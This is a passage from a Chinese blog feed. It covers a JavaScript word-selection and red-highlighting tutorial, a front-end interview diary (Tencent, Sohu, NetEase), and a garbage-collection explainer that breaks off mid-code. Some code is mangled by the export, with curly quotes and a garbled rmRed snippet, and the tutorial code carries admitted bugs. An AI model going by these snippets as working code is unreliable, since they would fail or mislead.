        <content type="html"><![CDATA[<p>按需求弄了一个 <strong>取词</strong> 以及 <strong>标红</strong> 的小应用。</p><p><a href="http://qianduannotes.sinaapp.com/getKeyword/" target="_blank"><img src="https://images.cnblogs.com/cnblogs_com/hustskyking/477032/o_%e8%a7%86%e5%9b%be.png" alt="" width="716" height="388"></a></p><p>先上demo ：<a title="取词&&标红 demo" href="http://qianduannotes.sinaapp.com/getKeyword/" target="_blank">http://qianduannotes.sinaapp.com/getKeyword/</a></p><p>很多平时常用的东西，都用上了，所以拿出来说说。</p><p><strong>一、代码</strong></p><div class="cnblogs_Highlighter"><pre class="brush:javascript;collapse:true;;gutter:false;">var GetKeywords = {  str: "",  limit: 11,  keywords:[],<p>  init : function(){<br>    var box &#x3D; this._(“article”),<br>      _this &#x3D; this;</p><pre><code>//获取已经存在的关键词this.getAllKeyWord();//让rmKeyWord函数全局化window.rmkeyWord = this.rmkeyWord;//取词事件box.onmouseup = function(evt)&#123;  var evt = evt || window.event,    target = evt.target || evt.srcElement;  //如果鼠标是在button上弹起，则忽略  if(target.id == &quot;btn&quot;) return;  GetKeywords.str = _this.getSelectionText();  if(_this.str.length == 0) return;  if(_this._(&quot;btn&quot;)) &#123;    _this.removeBtn();    if(GetKeywords.str == &quot;&quot;) return;    _this.createBtn(evt);    return;  &#125;  _this.createBtn(evt);&#125;</code></pre><p>  },</p><p>  &#x2F;&#x2F;工具函数<br>  _: function(obj){<br>    return document.getElementById(obj);<br>  },</p><p>  &#x2F;&#x2F;获取选中文本<br>  getSelectionText: function(){<br>    if(window.getSelection) {<br>      return window.getSelection().toString();<br>    } else if(document.selection &amp;&amp; document.selection.createRange) {<br>      return document.selection.createRange().text;<br>    }<br>    return ‘’;<br>  },</p><p>  &#x2F;&#x2F;创建按钮<br>  createBtn: function(evt){<br>    var button &#x3D; document.createElement(“div”),<br>      evt &#x3D; evt || window.event,<br>      x &#x3D; evt.pageX || evt.x,<br>      y &#x3D; evt.pageY || evt.y,<br>      i, j, len,<br>      cssList &#x3D; “”,<br>      _this &#x3D; this,<br>      csses &#x3D; {<br>        “height” : “30px”,<br>        “line-height” : “30px”,<br>        “position”: “absolute”,<br>        “top”: y + 10 + “px”,<br>        “left”: x + 10 + “px”,<br>        “cursor”: “pointer”,<br>        “border”: “1px solid #000”,<br>        “background”: “#EEE”,<br>        “padding”: “2px 8px”,<br>        “border-radius”: “3px”<br>      };<br>    for(i in csses){<br>      if(csses.hasOwnProperty(i)){<br>        cssList +&#x3D; i + “:” + csses[i] + “;”;<br>      }<br>    }<br>    button.style.cssText &#x3D; cssList;<br>    button.innerHTML &#x3D; “添加到关键词列表”;<br>    button.setAttribute(“id”, “btn”);</p><pre><code>this._(&quot;article&quot;).appendChild(button);button.onclick = function()&#123;  if(_this.str.length &amp;gt; _this.limit)&#123;    alert(&quot;关键词长度最长为11，可以通过设置GetKeywords.limit来控制长度。&quot;);    _this.removeBtn();    return;  &#125;  for(j = 0, len = GetKeywords.keywords.length; j &amp;lt; len; j++)&#123;    if(GetKeywords.keywords[j] == _this.str)&#123;      alert(&quot;已经存在该关键词了~&quot;);      _this.removeBtn();      return;    &#125;    continue;  &#125;  _this.keywords.push(_this.str);  _this.setRed(_this.str);  _this.addTo();  _this.removeBtn();&#125;;</code></pre><p>  },</p><p>  &#x2F;&#x2F;删除按钮<br>  removeBtn: function(){<br>    var btn &#x3D; this._(“btn”);<br>    btn.parentNode.removeChild(btn);<br>  },</p><p>  &#x2F;&#x2F;加入到关键词里列表<br>  addTo: function(){<br>    var word &#x3D; this._(“wordList”);<br>    word.innerHTML +&#x3D; “&lt;span&gt;&lt;font&gt;” + this.str + “&lt;&#x2F;font&gt;&lt;a href&#x3D;’#’ onclick&#x3D;’rmkeyWord(this);’&gt;&lt;&#x2F;a&gt;&lt;&#x2F;span&gt;”;<br>  },</p><p>  &#x2F;&#x2F;关键词标红<br>  setRed: function(str){<br>    var content &#x3D; this._(“article”),<br>      temp &#x3D; ‘(‘ + str + ‘)’;<br>      reg &#x3D; new RegExp(temp,’g’);</p><pre><code>content.innerHTML = content.innerHTML.replace(reg, &quot;&amp;lt;span style=&#39;color:red;&#39;&amp;gt;$1&amp;lt;/span&amp;gt;&quot;);</code></pre><p>  },</p><p>  &#x2F;&#x2F;删除标红<br>  rmRed: function(str){<br>    var content &#x3D; this._(“article”),<br>      temp &#x3D; “(&lt;span[^&lt;]*” + str + “&lt;&#x2F;span&gt;)”;<br>      reg &#x3D; new RegExp(temp,’gi’);<br>    content.innerHTML &#x3D; content.innerHTML.replace(reg, str);<br>  },</p><p>  &#x2F;&#x2F;获取已经存在的关键词（也可以用来获取所有关键词）<br>  getAllKeyWord: function (){<br>    var spans &#x3D; this._(“wordList”).getElementsByTagName(“span”),<br>      key &#x3D; [], i &#x3D; 0, len;<br>    for(len &#x3D; spans.length; i &lt; len; i++){<br>      var font &#x3D; spans[i].getElementsByTagName(“font”)[0];<br>      var temp &#x3D; font.innerText || font.textContent;<br>      this.setRed(temp);<br>      key.push(temp);<br>    }<br>    this.keywords &#x3D; key;<br>  },</p><p>  &#x2F;&#x2F;删除关键词<br>  rmkeyWord: function (obj){<br>    var target &#x3D; obj.parentNode,<br>      word &#x3D; obj.previousSibling.innerHTML,<br>      i &#x3D; 0, len;<br>    GetKeywords.rmRed(word);<br>    for(len &#x3D; GetKeywords.keywords.length; i &lt; len; i++){<br>      if(GetKeywords.keywords[i] &#x3D;&#x3D; word){<br>        GetKeywords.keywords.splice(i,i);<br>      }<br>      continue;<br>    }<br>    target.parentNode.removeChild(target);<br>    return;<br>  }<br>}</p><p>GetKeywords.init();</pre></p></div><p><span>以上是所有js代码，比较长，下面将列举一些比较突出的点（望高人多多指点）。</span></p><p><strong>二、代码分析</strong></p><p><strong>1.获取文本</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="attr">getSelectionText</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">window</span>.<span class="property">getSelection</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">window</span>.<span class="title function_">getSelection</span>().<span class="title function_">toString</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">document</span>.<span class="property">selection</span> &amp;&amp; <span class="variable language_">document</span>.<span class="property">selection</span>.<span class="property">createRange</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">document</span>.<span class="property">selection</span>.<span class="title function_">createRange</span>().<span class="property">text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个在以前（<a class="titlelink" href="http://www.cnblogs.com/hustskyking/archive/2013/04/11/set_and_get_cursor_position.html" target="_blank">JavaScript操控光标，你会么？</a>）的文章里也说过，就不赘述了。</p><p><strong>2.创建控制框</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="attr">createBtn</span>: <span class="keyword">function</span>(<span class="params">evt</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> button = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>),</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">        csses = &#123;</span><br><span class="line">            <span class="string">&quot;height&quot;</span> : <span class="string">&quot;30px&quot;</span>,</span><br><span class="line">            <span class="string">&quot;line-height&quot;</span> : <span class="string">&quot;30px&quot;</span>,</span><br><span class="line">            <span class="string">&quot;position&quot;</span>: <span class="string">&quot;absolute&quot;</span>,</span><br><span class="line">            <span class="string">&quot;top&quot;</span>: y + <span class="number">10</span> + <span class="string">&quot;px&quot;</span>,</span><br><span class="line">            <span class="string">&quot;left&quot;</span>: x + <span class="number">10</span> + <span class="string">&quot;px&quot;</span>,</span><br><span class="line">            <span class="string">&quot;cursor&quot;</span>: <span class="string">&quot;pointer&quot;</span>,</span><br><span class="line">            <span class="string">&quot;border&quot;</span>: <span class="string">&quot;1px solid #000&quot;</span>,</span><br><span class="line">            <span class="string">&quot;background&quot;</span>: <span class="string">&quot;#EEE&quot;</span>,</span><br><span class="line">            <span class="string">&quot;padding&quot;</span>: <span class="string">&quot;2px 8px&quot;</span>,</span><br><span class="line">            <span class="string">&quot;border-radius&quot;</span>: <span class="string">&quot;3px&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line">    <span class="keyword">for</span>(i <span class="keyword">in</span> csses)&#123;</span><br><span class="line">        <span class="keyword">if</span>(csses.<span class="title function_">hasOwnProperty</span>(i))&#123;</span><br><span class="line">            cssList += i + <span class="string">&quot;:&quot;</span> + csses[i] + <span class="string">&quot;;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    button.<span class="property">style</span>.<span class="property">cssText</span> = cssList;</span><br><span class="line">    button.<span class="property">innerHTML</span> = <span class="string">&quot;添加到关键词列表&quot;</span>;</span><br><span class="line">    button.<span class="title function_">setAttribute</span>(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;btn&quot;</span>);</span><br><span class="line">　　<span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里有一点我想说说，在写js的时候，会经常涉及到对DOM对象style的处理，如果不想额外加入一个plugins.css之类的文件，可以像上面一样，将样式放置在一个对象中，然后利用for in将其写入，本来开始我用的是</p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">obj.style[i] <span class="operator">=</span> csses[i]<span class="comment">;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>不知道为什么，在IE下报错了，后来便用cssText代替。</p><p>效果：</p><p><a href="http://qianduannotes.sinaapp.com/getKeyword/" target="_blank"><img src="https://images.cnblogs.com/cnblogs_com/hustskyking/477032/o_%e6%b7%bb%e5%8a%a0%e5%88%b0%e5%88%97%e8%a1%a8.png" alt="添加到列表" width="610" height="312"></a></p><p><strong>3.标红</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//关键词标红</span></span><br><span class="line"><span class="attr">setRed</span>: <span class="keyword">function</span>(<span class="params">str</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> content = <span class="variable language_">this</span>.<span class="title function_">_</span>(<span class="string">&quot;article&quot;</span>),</span><br><span class="line">        temp = <span class="string">&#x27;(&#x27;</span> + str + <span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">        reg = <span class="keyword">new</span> <span class="title class_">RegExp</span>(temp,<span class="string">&#x27;g&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    content.<span class="property">innerHTML</span> = content.<span class="property">innerHTML</span>.<span class="title function_">replace</span>(reg, <span class="string">&quot;&lt;span&gt;$1&lt;/span&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里主要就是正则表达式的事情了，正则的话，推荐两篇文章</p><ul><li>一篇是司徒正美的，讲的比较全面，比较系统。<a href="http://www.cnblogs.com/rubylouvre/archive/2009/11/02/1594731.html" target="_blank">点我链接过去→</a></li><li>一篇是30分钟搞定正则，这个讲说是对所有语言，JS的话正则这一块还不是特别完善和强大。<a href="http://manual.phpv.net/regular_expression.html" target="_blank">点我链接过去→</a></li></ul><p>哈哈，相信用过正则的人不需要我来解释这个<span>$1</span>了吧，他的意思就是匹配到的第一个。</p><p>当然，删除标红和这个原理是差不多的。</p><figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="comment">//删除标红</span></span><br><span class="line">rmRed: function(<span class="built_in">str</span>)&#123;</span><br><span class="line">    <span class="built_in">var</span> content = <span class="keyword">this</span>._(<span class="string">&quot;article&quot;</span>),</span><br><span class="line">        temp = <span class="string">&quot;(&lt;span[^&lt;]*&quot;</span> +=<span class="string">&quot;&quot;</span> <span class="built_in">str</span>=<span class="string">&quot;&quot;</span> <span class="string">&quot;&lt;=&quot;</span><span class="string">&quot; span=&quot;</span><span class="string">&quot;&gt;)&quot;</span>;</span><br><span class="line">        reg = <span class="keyword">new</span> RegExp(temp,<span class="string">&#x27;gi&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    content.innerHTML = content.innerHTML.replace(reg, <span class="built_in">str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&lt;&#x2F;span[^&lt;]*”&gt;</p><p>这里是写完这篇blog才发现的一个bug， IE下如果rmRed中的正则是'g',貌似该函数会无效，在IE8控制台下查看，NND，输出innerHTML中的标签全部变成大写了，无奈，只好改成'gi'。</p><p><strong>4.获取所有关键词和删除关键词</strong></p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span>获取已经存在的关键词（也可以用来获取所有关键词）</span><br><span class="line">getAllKeyWord: <span class="keyword">function</span> ()&#123;</span><br><span class="line">    <span class="regexp">//</span>...</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>删除关键词</span><br><span class="line">rmkeyWord: <span class="keyword">function</span> (obj)&#123;</span><br><span class="line">    <span class="regexp">//</span>...</span><br><span class="line">    GetKeywords.rmRed(word);</span><br><span class="line">    <span class="keyword">for</span>(len = GetKeywords.keywords.length; i &lt; len; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(GetKeywords.keywords[i] == word)&#123;</span><br><span class="line">            GetKeywords.keywords.splice(i,i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="regexp">//</span>...</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个地方，有一个疑问，在调用的时候，使用this.keywords没反应，但是改成GetKeywords就行了，还没研究具体原因是什么~</p><p><strong>5.初始化</strong></p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">GetKeywords.init()<span class="comment">;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>init()为总入口，进去之后，先获取已经存在的关键词，然后标红，接着绑定onmouseup事件。</p><p><strong>三、然后</strong></p><p>当然咯，这个案例的ajax部分还没写，弄完之后还得给后台送过去。。好吧，明天接着弄吧。</p><p>写这玩意儿还是花了点功夫，不过鄙人写代码的水平还在初级阶段，望大神们不要吐槽，多提宝贵意见，谢谢！</p><p>然后，还是那个demo，<a title="取词&&标红 demo" href="http://qianduannotes.sinaapp.com/getKeyword/" target="_blank">http://qianduannotes.sinaapp.com/getKeyword/</a></p><p>顺便，推广下，团队做的一个网站，主要技术是爬虫，高峰期PV稳定在120W以上，找工作的童鞋可以多去踩踩~</p><p><strong><a title="海投网" href="http://xjh.haitou.cc/" target="_blank">宣讲会查询系统&mdash;&mdash;海投网</a>&nbsp;</strong></p><p>P.S：刚让队友测试，还是发现了不少bug，果然考虑问题还是不全面啊~还要继续加油。。。</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 杂物间 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>腾讯的三轮面试（web前端）</title>
      <link href="/blog/2013/04/27/cb-mianshi/"/>
      <url>/blog/2013/04/27/cb-mianshi/</url>
      
        <content type="html"><![CDATA[<p><strong></strong>笔试就不说了，说多了都是泪，选择题基本不会，幸好填空题和附加题都拿下了，貌似最后78分。</p><p><strong>【一面】~=110分钟 &nbsp;2013/04/24 11:20 &nbsp;星期三</strong></p><p>进门静坐30分钟做题。</p><p>填空题+大题+问答题</p><p>&gt;&gt;填空题何时接触电脑  何时接触前端运算符   字符串处理 延时  display position  XMLHttpRequest  正则Jquery绑定事件  cookie</p><p>&gt;&gt;大题BOM浏览器信息浏览器兼容性举例闭包作用与举例新闻ul列表，插入3个，获取index全文单词首字母大写ajax过程</p><p>&gt;&gt;逻辑题任何时间分针和时针夹角文章单词（字母）频率出现最高30分钟等到车概率是70%，那10分钟呢？一个班学舞蹈的有75%，学唱歌的有85%，问同时学习舞蹈和唱歌的最多多少，最少多少？两个很大数的加法运算</p><p>&gt;&gt;我的提问为什么不问我框架你觉得我哪些方面还有欠缺，觉得我如何如果有望进入二面，什么时候可以得到通知</p><p>&gt;&gt;完了之后一起下楼时我说其他几家公司的问题和腾讯的有比较大的区别，区别是XXXXXX然后他问我家在哪里然后说深圳还是比较适合我我说但愿还能见到你他笑了笑</p><p><strong>【二面】~=40分钟&nbsp;<strong>2013/04/25 14:00 &nbsp;星期四</strong></strong>面试时间是两点钟，两点过几分进入了面试官所在的包间。进去之前楼下签到的hr要我把一摞草稿纸带到621房间的面试官，进门给他之后，他说那把大椅子是坏的，要我往后坐一点（防止向前倾倒）。</p><p>开始的时候他没怎么说话，埋头看着我的简历，于是我主动开始扯了几句关于自己的介绍。也不知他听到没有，等我说完，马上又说：好吧，你先自我介绍下。（一脸黑线...）</p><p>期间问了我为什么不打算考研，为什么选择前端，我做的最自豪的事情是什么。</p><p>叽哩吧啦一阵子后，他要我说说我的人生规划和职业规划（颇为蛋疼，这些问题不是应该HR面才会问的么），我顺着他的来，也比较xx的说了一番。</p><p>反向代理输入网址到出现页面的过程（IP解析，DNS解析等）页面流量堆栈</p><p>接着，问了我-1在计算机中怎么表示，如何判断数组A是否为数组B的子集。然后是一个概率问题，假设长江以北有80W人，长江以南有20W人，A向B打电话算一个电话，如果打了10W个电话，那么长江以北打向长江以南的电话有多少个？</p><p>没问太多问题，都是些基础的，最后他问我有什么问题。</p><p>&gt;&gt;我问了问为什么不问我前端的问题如果通过二面，什么时候可以给我回复对我有什么学习上的建议</p><p>面试官留言：\一把刀有刀锋和刀背，刀锋要磨锐利，但是刀背的锻炼也要加强。"</p><p><strong>【HR面】~=30分钟 2013/04/27 20:00 星期六</strong>进去先看上几位面试官对我的评价，安静时刻我跟她扯淡了几句，缓和了下尴尬的气氛。然后她瞄了瞄我的简历，接着就问我考不考研，很明显我的答案是不。然后她又问为什么~接着让我说说自己最满意的一件事和最不满意的一件事，自己最大的缺点和最大的优点扯了半天之后（此处略去20分钟扯淡），又开始看我的简历，问了我项目中遇到哪些困难，我说了一个还未解决的bug，她反问为什么不解决，然后叽哩吧啦了一阵子。</p><p>最后问我有没有什么问题。按惯例，问了问最早什么时候给通知，然后问了问期间如果有不明白问题可以通过什么方式联系她之类的。</p><p>整个过程还算顺利。</p><p><strong>HR告诉我五一之后可以查询录取状态，求人品吧~</strong></p><p><strong>顺便把在搜狐和网易的面试笔试经历也说说吧~</strong></p><p><strong>&gt;&gt;搜狐</strong></p><p>搜狐的太久了，记不太清楚了</p><p>那次只为攒经验，是俺平生第一次参加公司面试。不过收获还是有的~</p><p>时间太久了，也记不清了，没有提交笔试题，但是还是要我去面试了。问他有几轮面试，告诉我因时间匆忙，只给一轮技术面，如果满意直接HR。</p><p>大概问题记不太清。虽然感觉答的还不错，但是最后还是被刷了。</p><p>【技术面】~=60分钟-问了下我在团队学了些什么。 -然后就是很多\你是怎么理解XX"。。-XX中有 闭包，原型链， 框架结构等</p><p>&gt;&gt;<strong>网易</strong></p><p>今天4.27，好像是3.26参加的面试，时间太久，也记得不是很清楚了。</p><p>我没有把任何面试官当做正经的面试官，男的就是我的学长，女的就是我的学姐，仅此而已，所以每次交流都是平和的心态。</p><p>学长们（每次面我的都是个男的）时不时露出笑意，现场气氛没有那么紧张。</p><p>【一面】 ~=30分钟闭包IE6趋势框架</p><p>【二面】 ~=90分钟框架比较 jQuery prototype YUI框架特点css兼容性   IE6 bugseaJS AMD CMD kissyJS原型链 闭包JS基础细节</p><p>不让谈百度框架</p><p>【HR面】~=25分钟自我介绍身边人的评价最不满意的一件事情规划为什么不想考研有什么困难</p><p>薪资待遇何时通知</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> 腾讯面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript垃圾回收机制</title>
      <link href="/blog/2013/04/27/cb-garbage-collection/"/>
      <url>/blog/2013/04/27/cb-garbage-collection/</url>
      
        <content type="html"><![CDATA[<p><strong>一、垃圾回收的必要性</strong></p><p>　　下面这段话引自《JavaScript权威指南（第四版）》</p><p><em>　　由于字符串、对象和数组没有固定大小，所有当他们的大小已知时，才能对他们进行动态的存储分配。JavaScript程序每次创建字符串、数组或对象时，解释器都必须分配内存来存储那个实体。只要像这样动态地分配了内存，最终都要释放这些内存以便他们能够被再用，否则，JavaScript的解释器将会消耗完系统中所有可用的内存，造成系统崩溃。</em></p><p>　　这段话解释了为什么需要系统需要垃圾回收，JS不像C/C++，他有自己的一套垃圾回收机制（Garbage Collection）。JavaScript的解释器可以检测到何时程序不再使用一个对象了，当他确定了一个对象是无用的时候，他就知道不再需要这个对象，可以把它所占用的内存释放掉了。例如：</p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">var a <span class="operator">=</span> <span class="string">&quot;before&quot;</span><span class="comment">;</span></span><br><span class="line">var b <span class="operator">=</span> <span class="string">&quot;override a&quot;</span><span class="comment">;</span></span><br><span class="line">var a <span class="operator">=</span> b<span class="comment">; //重写a</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　这段代码运行之后，\before"这个字符串失去了引用（之前是被a引用），系统检测到这个事实之后，就会释放该字符串的存储空间以便这些空间可以被再利用。</p><p><strong>二、垃圾回收原理浅析</strong></p><p><span>　　现在各大浏览器通常用采用的垃圾回收有两种方法：标记清除、引用计数。</span></p><p><strong>1、标记清除</strong></p><p>　　这是javascript中最常用的垃圾回收方式。当变量进入执行环境是，就标记这个变量为\进入环境"。从逻辑上讲，永远不能释放进入环境的变量所占用的内存，因为只要执行流进入相应的环境，就可能会用到他们。当变量离开环境时，则将其标记为\离开环境"。　　垃圾收集器在运行的时候会给存储在内存中的所有变量都加上标记。然后，它会去掉环境中的变量以及被环境中的变量引用的标记。而在此之后再被加上标记的变量将被视为准备删除的变量，原因是环境中的变量已经无法访问到这些变量了。最后。垃圾收集器完成内存清除工作，销毁那些带标记的值，并回收他们所占用的内存空间。</p><p><em>关于这一块，建议读读<a title="作用域链" href="http://www.cnblogs.com/TomXu/archive/2012/01/18/2312463.html" target="_blank">Tom大叔的几篇文章</a>，关于作用域链的一些知识详解，读完差不多就知道了，哪些变量会被做标记。</em><strong>2、引用计数</strong></p><p>　　另一种不太常见的垃圾回收策略是引用计数。引用计数的含义是跟踪记录每个值被引用的次数。当声明了一个变量并将一个引用类型赋值给该变量时，则这个值的引用次数就是1。相反，如果包含对这个值引用的变量又取得了另外一个值，则这个值的引用次数就减1。当这个引用次数变成0时，则说明没有办法再访问这个值了，因而就可以将其所占的内存空间给收回来。这样，垃圾收集器下次再运行时，它就会释放那些引用次数为0的值所占的内存。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但是用这种方法存在着一个问题，下面来看看代码：</p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">function problem() &#123;</span><br><span class="line">    var objA <span class="operator">=</span> new Object()<span class="comment">;</span></span><br><span class="line">    var objB <span class="operator">=</span> new Object()<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">    objA.someOtherObject <span class="operator">=</span> objB<span class="comment">;</span></span><br><span class="line">    objB.anotherObject <span class="operator">=</span> objA<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　在这个例子中，objA和objB通过各自的属性相互引用；也就是说这两个对象的引用次数都是2。在采用引用计数的策略中，由于函数执行之后，这两个对象都离开了作用域，函数执行完成之后，objA和objB还将会继续存在，因为他们的引用次数永远不会是0。这样的相互引用如果说很大量的存在就会导致大量的内存泄露。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;　　我们知道，IE中有一部分对象并不是原生JavaScript对象。例如，其BOM和DOM中的对象就是使用C++以COM（Component Object&nbsp;Model，组件对象）对象的形式实现的，而COM对象的垃圾回收器就是采用的引用计数的策略。因此，即使IE的Javascript引擎使用标记清除的策略来实现的，但JavaScript访问的COM对象依然是基于引用计数的策略的。说白了，只要IE中涉及COM对象，就会存在循环引用的问题。看看下面的这个简单的例子：</p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">var element <span class="operator">=</span> document.getElementById(<span class="string">&quot;some_element&quot;</span>)<span class="comment">;</span></span><br><span class="line">var myObj <span class="operator">=</span>new Object()<span class="comment">;</span></span><br><span class="line">myObj.element <span class="operator">=</span> element<span class="comment">;</span></span><br><span class="line">element.someObject <span class="operator">=</span> myObj<span class="comment">;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　上面这个例子中，在一个DOM元素(element)与一个原生JavaScript对象(myObj)之间建立了循环引用。其中，变量myObj有一个名为element的属性指向element；而变量element有一个名为someObject的属性回指到myObj。由于循环引用，即使将例子中的DOM从页面中移除，内存也永远不会回收。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;　　不过上面的问题也不是不能解决，我们可以手动切断他们的循环引用。</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">myObj.element</span> = null<span class="comment">;</span></span><br><span class="line"><span class="attr">element.someObject</span> =null<span class="comment">;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>　　这样写代码的话就可以解决循环引用的问题了，也就防止了内存泄露的问题。</p><p><strong>三、减少JavaScript中的垃圾回收</strong></p><p>　　首先，最明显的，new关键字就意味着一次内存分配，例如 new Foo()。最好的处理方法是：在初始化的时候新建对象，然后在后续过程中尽量多的重用这些创建好的对象。</p><p>另外还有以下三种内存分配表达式（可能不像new关键字那么明显了）：</p><ul><li>{} （创建一个新对象）</li><li>[] （创建一个新数组）</li><li>function() {...} (创建一个新的方法，注意：新建方法也会导致垃圾收集！！)</li></ul><p><strong>1、对象object优化</strong></p><p>　　为了最大限度的实现对象的重用，应该像避使用new语句一样避免使用{}来新建对象。</p><p>　　{\foo":"bar"}这种方式新建的带属性的对象，常常作为方法的返回值来使用，可是这将会导致过多的内存创建，因此最好的解决办法是：每一次函数调用完成之后，将需要返回的数据放入一个全局的对象中，并返回此全局对象。如果使用这种方式，就意味着每一次方法调用都会导致全局对象内容的修改，这有可能会导致错误的发生。因此，一定要对此全局对象的使用进行详细的注释和说明。</p><p>　　有一种方式能够保证对象（确保对象prototype上没有属性）的重复利用，那就是遍历此对象的所有属性，并逐个删除，最终将对象清理为一个空对象。</p><p>　　cr.wipe(obj)方法就是为此功能而生，代码如下：<em><em>&nbsp;</em></em></p><div><figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 删除obj对象的所有属性，高效的将obj转化为一个崭新的对象！</span></span><br><span class="line">cr.wipe = <span class="keyword">function</span> <span class="params">(obj)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> p <span class="keyword">in</span> obj) &#123;</span><br><span class="line">         <span class="keyword">if</span> (obj.hasOwnProperty(p))</span><br><span class="line">            <span class="keyword">delete</span> obj[p];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;        </span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>　　有些时候，你可以使用cr.wipe(obj)方法清理对象，再为obj添加新的属性，就可以达到重复利用对象的目的。虽然通过清空一个对象来获取\新对象"的做法，比简单的通过{}来创建对象要耗时一些，但是在实时性要求很高的代码中，这一点短暂的时间消耗，将会有效的减少垃圾堆积，并且最终避免垃圾回收暂停，这是非常值得的！</p><p><strong>2、数组array优化</strong></p><p>　　将[]赋值给一个数组对象，是清空数组的捷径（例如： arr = [];），但是需要注意的是，这种方式又创建了一个新的空对象，并且将原来的数组对象变成了一小片内存垃圾！实际上，将数组长度赋值为0（arr.length = 0）也能达到清空数组的目的，并且同时能实现数组重用，减少内存垃圾的产生。</p><p><strong>3、方法function优化</strong></p><p>　　方法一般都是在初始化的时候创建，并且此后很少在运行时进行动态内存分配，这就使得导致内存垃圾产生的方法，找起来就不是那么容易了。但是从另一角度来说，这更便于我们寻找了，因为只要是动态创建方法的地方，就有可能产生内存垃圾。例如：将方法作为返回值，就是一个动态创建方法的实例。</p><p>　　在游戏的主循环中，setTimeout或requestAnimationFrame来调用一个成员方法是很常见的，例如：</p><div><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(</span><br><span class="line">    (<span class="keyword">function</span>(<span class="params">self</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">              self.<span class="title function_">tick</span>();</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)(<span class="variable language_">this</span>), <span class="number">16</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>　　每过16毫秒调用一次this.tick()，嗯，乍一看似乎没什么问题，但是仔细一琢磨，每一次调用都返回了一个新的方法对象，这就导致了大量的方法对象垃圾！</p><p>　　为了解决这个问题，可以将作为返回值的方法保存起来，例如：</p><div><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// at startup</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">tickFunc</span> = (</span><br><span class="line">    <span class="keyword">function</span>(<span class="params">self</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                self.<span class="title function_">tick</span>();</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">)(<span class="variable language_">this</span>);</span><br><span 